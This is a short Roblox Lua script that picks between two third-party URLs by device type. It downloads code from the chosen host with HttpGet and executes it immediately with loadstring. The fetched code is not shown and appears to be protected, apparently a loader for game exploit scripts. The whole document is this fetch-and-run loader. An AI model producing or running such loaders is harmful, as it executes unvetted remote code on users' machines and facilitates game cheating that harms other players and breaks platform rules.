local UIS = game:GetService("UserInputService")
local mobile = UIS.TouchEnabled and not UIS.KeyboardEnabled

if mobile then
    loadstring(game:HttpGet("https://vss.pandadevelopment.net/virtual/file/f97e3a87f29d4871"))()
else
    loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/230ba0efdee09ac0dccdcf0b566fec49"))()
end
